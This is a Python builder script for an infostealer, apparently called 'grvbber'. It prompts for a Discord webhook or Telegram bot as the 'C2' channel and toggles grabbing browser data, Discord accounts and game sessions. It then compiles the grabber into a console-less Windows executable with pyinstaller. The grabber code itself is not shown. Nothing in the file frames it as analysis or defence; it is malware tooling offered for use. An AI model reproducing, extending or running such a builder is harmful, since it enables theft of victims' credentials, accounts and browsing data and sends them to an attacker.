import os
import subprocess
import ctypes
import pystyle
import requests
import time
import json

from resources.console import *

os.system('mode con: cols=150 lines=50')

configfile = "conf/config.py"
configjson = 'conf/config.json'
config = {
    "type": "discord",
    "hook": "",
    "tg_token": "",
    "tg_chat": "",
    "browsers": False,
    "discordacc": False,
    "games": False,
}

def load(file):
    with open(file, 'r') as f:
        return json.load(f)

def save(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)


def testwebhook(webhook):
    r = requests.get(webhook)
    if r.status_code == 200:
        return 'valid'

if os.path.exists(configfile):
    try:
        loaded = {}
        with open(configfile, "r", encoding="utf-8") as f:
            exec(f.read(), {}, loaded)
        for k in config:
            if k in loaded:
                config[k] = loaded[k]
    except Exception:
        pass

def cls():
    os.system('cls')
    
cls()
def applysettings():
    with open(configfile, "w", encoding="utf-8") as f:
        for key, value in config.items():
            f.write(f"{key} = {repr(value)}\n")

def fetchsettings():
    c2type = config['type']
    webhookurl = config['hook']
    telebot = config['tg_token'] + ' ' + '|' + ' ' + config['tg_chat']
    grabbrowsers = config['browsers']
    grabdiscord = config['discordacc']
    grabgames = config['games']
    if c2type == 'discord':
        print('''Settings
        
    C2 Type: {}
    Webhook URL: {}
    Grab browsing data: {}
    Grab discord accounts: {}
    Grab game sessions: {}'''.format(c2type, webhookurl, grabbrowsers, grabdiscord, grabgames))
    elif c2type == 'telegram':
        print('''Settings
        
    C2 Type: {}
    Telegram bot and chat id: {}
    Grab browsing data: {}
    Grab discord accounts: {}
    Grab game sessions: {}'''.format(c2type, telebot, grabbrowsers, grabdiscord, grabgames))

def menu():
    global config
    asc = Ascii()
    print(asc.ascii())
    print(Options().options())
    options = ['ChangeC2', 'CollectBrowsers', 'CollectDiscord', 'CollectGames', 'SaveSettings', 'Compile']
    
    fetchsettings()
    opts = {str(i + 1): name for i, name in enumerate(options)}
    
    while True:
        try:
            i = Logging.inp('Builder', 'Option')
            name = opts[i]
            if name == 'ChangeC2':
                print('type "discord" or "telegram"')
                c2type = Logging.inp('Builder', 'Type')
                while True:
                    if c2type.lower() == 'discord':
                        webhook = Logging.inp('Builder', 'Webhook')
                        if webhook.startswith('https://') and 'discord' in webhook and 'api/webhooks/' in webhook:
                            valid = testwebhook(webhook)
                            if valid == 'valid':
                                config['hook'] = webhook
                                Logging.info('Successfully added webhook {}'.format(webhook))
                                config['type'] = 'discord'
                                Logging.inp2('Press Enter')
                                cls()
                                menu()
                    elif c2type.lower() == 'telegram':
                        config['tg_token'] = Logging.inp('Builder', 'Bot Token')
                        config['tg_chat'] = Logging.inp('Builder', 'Chat ID')
                        config['type'] = 'telegram'
                        cls()
                        menu()
                    else:
                        cls()
                        menu()
            
            elif name == 'CollectBrowsers':
                config['browsers'] = not config['browsers']
                cls()
                menu()

            elif name == 'CollectDiscord':
                config['discordacc'] = not config['discordacc']
                cls()
                menu()

            elif name == 'CollectGames':
                config['games'] = not config['games']
                cls()
                menu()
            
            elif name == 'SaveSettings':
                applysettings()
                cls()
                menu()
            elif name == 'Compile':
                Logging.info('Turning into an exe')
                os.system('pip install -r requirements.txt')
                os.system('pyinstaller --onefile --noconsole --name CharlieKirk --i NONE grvbber.py')
                try:
                    os.startfile('dist')
                except Exception as e:

                    Logging.fail('Failed to open dist folder. Open it yourself. If you don\'t see any files then rerun this.') 
                
                Logging.inp2('Press enter') 
                cls()
                menu()

        except KeyError:
            Logging.fail('Choose another option')
        
        except Exception as e:
            Logging.fail('some sort of fail happened idfk {}'.format(e))
menu()
